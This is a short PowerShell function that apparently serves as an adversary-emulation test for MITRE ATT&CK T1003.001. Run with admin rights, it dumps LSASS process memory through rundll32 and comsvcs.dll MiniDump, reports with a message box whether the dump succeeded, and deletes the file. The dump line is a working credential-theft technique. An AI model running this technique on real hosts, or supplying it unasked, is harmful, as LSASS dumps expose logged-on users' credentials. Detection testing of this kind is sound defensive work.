<#
.SYNOPSIS
Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. 
As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.

https://attack.mitre.org/techniques/T1003/001/

.DESCRIPTION
Built-in Windows tools such as comsvcs.dll can be used to dump lsass

Assumption that lsass is running unprotected and can be read and powershell runs as admin. 
#>




function Invoke-LsassDump1 {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $false)]
        [String]$program= ''
    )
    Begin {
		Add-Type -AssemblyName PresentationFramework;
    }

    Process {
		$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent());
		if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){
			$fileName = [System.IO.Path]::GetTempFileName();
			.\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id $fileName full
			Start-Sleep 5
			If ((Get-Item $fileName).length -gt 0kb) {
				[System.Windows.MessageBox]::Show('Lsass dump worked - '+$fileName);
				Remove-Item $fileName
			}else{
				[System.Windows.MessageBox]::Show('Lsass is protected');
			}
		}else{
			[System.Windows.MessageBox]::Show('You have to be Administrator');		
		}	
    }

}


